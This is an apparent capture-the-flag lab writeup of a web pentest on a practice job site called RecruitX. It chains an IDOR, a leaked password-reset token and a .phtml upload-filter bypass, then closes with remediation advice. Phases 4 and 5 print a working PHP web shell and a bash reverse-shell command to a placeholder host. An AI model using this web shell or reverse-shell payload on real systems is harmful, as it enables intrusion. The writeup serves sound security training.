# Guided Pentest: Web - Lab Notes & Writeup

# 1. Reconnaissance & Enumeration

The engagement began with systematic network and application enumeration to map the attack surface of the RecruitX platform.

Network Scanning & Port Discovery

An initial comprehensive TCP port scan was executed using Nmap to identify open ports, running services, and potential entry points on the target (MACHINE_IP):

    nmap -sV -sC -p- MACHINE_IP

Key Findings:

    Port 22 (SSH): OpenSSH 9.6p1 (valuable for later system access if valid credentials are recovered).

    Port 80 (HTTP): Apache httpd 2.4.58 running the main RecruitX web application (RecruitX — Home).

    Port 3306 (MySQL): Database service, indicating backend data storage that is potentially vulnerable to injection or data handling flaws.

    Port 8080 (HTTP): Secondary Apache instance serving a default status/test page.

Application Fingerprinting & Tech Stack

To determine the application framework and headers, a manual HTTP header inspection was performed:

curl -I http://MACHINE_IP

    Server Header: Apache/2.4.58 (Ubuntu)

    Session Management: PHPSESSID cookie observed without the httponly flag set (noted as a secondary hardening issue).

    Technology Stack Confirmed: Classic LAMP stack (Linux, Apache, MySQL, PHP).

Directory & Endpoint Enumeration

Using Gobuster alongside a common wordlist and PHP extension filters, hidden directories and files were mapped across the web root:
Bash

gobuster dir -u http://MACHINE_IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php

High-Value Discoveries:

    /admin: Administrative panel (redirects to login; target for privilege escalation).

    /api: Internal API root containing unauthenticated structural hints.

    /reset.php: Password reset workflow page.

    /uploads: Target directory for user-submitted files.

    /profile.php & /dashboard.php: Authenticated user areas requiring session context.

API Surface Discovery

Querying the unauthenticated /api/ endpoint revealed internal route maps, exposing structural layout information prematurely:

    curl http://MACHINE_IP/api/
    # Output: {"endpoints":["\/api\/user","\/api\/jobs","\/api\/applications"]}

# 2. Exploitation

Gaining remote code execution on the underlying server required chaining multiple low-to-medium severity vulnerabilities together, moving systematically from an unauthenticated posture to full administrative compromise.

Phase 1: Insecure Direct Object Reference (IDOR)

While authenticated as a standard test user (testuser@fake.thm), navigating to the user profile revealed a predictable numeric parameter in the URL:

    Target Endpoint: http://MACHINE_IP/profile.php?id=6

By modifying the id parameter from 6 to 1, the application exposed unauthorized user records due to a complete lack of server-side authorization checks. Furthermore, investigating the unauthenticated /api/ endpoint yielded even more granular data:

    curl -s "http://MACHINE_IP/api/user?id=1"
    # Output: {"id":1,"name":"Sarah Mitchell","email":"s.mitchell@recruitx.thm","role":"administrator","created":"2026-03-24"}

Enumerating IDs 1 through 5 successfully leaked the roles, names, and emails of all internal users, identifying Sarah Mitchell as the primary system administrator (s.mitchell@recruitx.thm).

Phase 2: Flawed Password Reset & Account Takeover

Instead of attempting brute-force attacks on the admin login, the password reset workflow at /reset.php was evaluated.

    Vulnerability: Submitting an email address triggered a password reset token that was improperly exposed directly within the server's HTTP response body.

    Token Characteristics: The tokens consisted of a weak, 6-digit numeric keyspace (e.g., 784512, 291037).

    Execution: By submitting Sarah Mitchell’s email (s.mitchell@recruitx.thm), the admin reset token was instantly disclosed. This token was immediately used to overwrite her password via the reset interface, resulting in a direct account takeover.

Phase 3: Admin Panel Access & File Upload Bypass

With valid administrator credentials, access was granted to the previously hidden administrative dashboard at /admin, which housed a file management and upload utility at /admin/upload.php.

    Client-Side Restriction Bypass: The upload form utilized a client-side accept attribute and input validation restricting files to documents and images. This was bypassed by inspecting the HTML DOM and removing the accept attribute.

    Server-Side Blocklist Flaw: Attempting to upload a raw .php file was rejected. However, the server's blocklist failed to account for alternative Apache-parsed PHP extensions. Uploading a file with a .phtml extension successfully bypassed the filter:

        Payload Uploaded: test.phtml containing basic PHP execution code.

        Verification: Navigating to http://MACHINE_IP/uploads/documents/test.phtml confirmed that Apache processed the file as active code rather than static text.

Phase 4: Web Shell Deployment & Remote Code Execution (RCE)

To interact with the server dynamically, a custom web shell (shell.phtml) was uploaded:

    <?php
    if(isset($_GET['cmd'])) {
        echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
    }
    ?>

Executing system-level commands through HTTP GET requests confirmed low-privileged code execution under the context of the web server user:

    curl "http://MACHINE_IP/uploads/documents/shell.phtml?cmd=id"
    # Output: uid=33(www-data) gid=33(www-data) groups=33(www-data)

Phase 5: Upgrading to an Interactive Reverse Shell

To overcome the limitations of single-command HTTP execution, a Netcat listener was established on the attack machine:

    nc -lvnp 4444

The web shell was then leveraged to trigger a reverse shell back to the listener using a URL-encoded bash payload:

    curl "http://MACHINE_IP/uploads/documents/shell.phtml?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/CONNECTION_IP/4444+0>%261'"

This established an interactive www-data shell on the host, allowing internal enumeration (such as reading /etc/passwd) and successful retrieval of the validation flag from /var/www/flag.txt.

# 3. Remediation

| Vulnerability | Severity | Impact in Chain |
| :--- | :--- | :--- |
| **API Endpoint Disclosure** | Medium | Exposed internal route structures to unauthenticated users. |
| **IDOR on User Profiles & API** | High | Leaked internal user records, identifying the system administrator's email. |
| **Flawed Password Reset Mechanism** | Critical | Exposed tokens in HTTP responses, allowing direct administrator account takeover. |
| **Incomplete File Extension Blocklist** | Critical | Permitted `.phtml` uploads, leading to arbitrary code execution. |

To secure the application, the engineering team must implement the following controls:

    Robust Access Control (IDOR Mitigation): Implement strict, server-side session-based authorization checks for all user profiles and API routes to ensure users can only access explicitly permitted data.

    Secure Password Reset Implementation: Never expose password reset tokens in HTTP response bodies or client interfaces. Use cryptographically secure, randomly generated tokens delivered exclusively via out-of-band channels (verified user email addresses) alongside       proper rate limiting.

    Secure File Upload Validation: Treat client-side restrictions (accept attributes) purely as user-experience enhancements. Implement strict server-side allowlists for approved file extensions and MIME types rather than blocklists, and configure the web server to         disable script execution within upload directories.

    API Hardening: Restrict internal API endpoints to authenticated administrative roles and remove unauthenticated index discovery paths.

Key Takeaways & Lessons Learned

    Enumeration is Foundation: Comprehensive pre-exploitation mapping of technology stacks, headers, and endpoints drives successful assessments.

    Small Flaws Compound: Standalone moderate bugs (IDOR, weak password resets) escalate drastically when chained together.

    Never Trust Client-Side Controls: Browser-level validation and flawed server-side blocklists are easily bypassed; secure applications rely strictly on robust server-side allowlisting.
